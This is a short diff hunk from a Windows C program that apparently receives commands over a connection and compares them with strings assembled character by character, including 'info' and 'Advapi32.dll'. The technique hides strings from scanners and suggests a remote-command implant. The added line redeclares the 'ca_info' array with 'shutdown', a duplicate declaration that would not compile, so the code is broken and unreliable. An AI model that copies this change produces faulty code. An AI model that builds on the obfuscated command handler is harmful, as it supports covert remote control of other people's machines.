@@ -143,6 +143,7 @@ WinMain(HINSTANCE hInstance,
 		
 		OutputDebugStringA("Received command: ");
 		char ca_info[] = { 'i','n','f','o',0 };
+		char ca_info[] = { 's','h','u','t','d','o','w','n',0 };
 		if ( strcmp(recvBuffer, ca_info) == 0 )
 		{
 			char ca_advapi32[256] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
